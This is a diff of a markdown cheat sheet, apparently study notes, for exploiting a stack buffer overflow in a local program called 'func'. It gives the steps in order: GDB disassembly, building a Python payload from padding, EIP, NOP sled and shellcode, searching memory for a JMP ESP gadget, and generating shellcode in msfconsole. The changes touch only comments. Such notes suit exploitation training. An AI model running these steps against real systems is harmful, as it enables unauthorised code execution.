@@ -1,5 +1,5 @@
 ### Run GDB against the program you want to view
-#### disass command to see what the code is performing and the memory spaces
+#### The disass command to see what the code is performing and the memory spaces
     gdb func
     disass getuserinput
 _____________________________________________________________________________________________________________________
@@ -27,7 +27,7 @@ ________________________________________________________________________________
     print(buffer + eip + nop + buf)
 _____________________________________________________________________________________________________________________
 ### Open the gdb enviroment to unset the memory.
-#### and the find command to locate the memory thats vulnerable to update your script.
+#### Use the find command to locate the memory thats vulnerable to update your script.
     env - gdb func
     show env
     unset LINES
@@ -35,9 +35,9 @@ ________________________________________________________________________________
     find /b 0xf7de2000 , 0xf7ffe000 , 0xff , 0xe4
 _____________________________________________________________________________________________________________________
 ### Open gdb against the program func
-#### testing the script continuously as you UPDATE IT.
+#### This is for testing the script continuously as you UPDATE IT.
     gdb func
-    run <<< $(python test.py)
+    run <<< $(python test.py)                     #The name of the script is test.py
 _____________________________________________________________________________________________________________________
 ### Run msfconsole to get the shellcode to run the command in the script.
 #### step will take several attempts of running the last command and pasting into script.
@@ -46,7 +46,7 @@ ________________________________________________________________________________
     show options
     set CMD whoami
     show options
-    generate -b "\x00" -f python               #copy the output and place into python script may take a few tries.
+    generate -b "\x00" -f python                  #copy the output and place into python script may take a few tries.
 _____________________________________________________________________________________________________________________
 ### 
 #### 
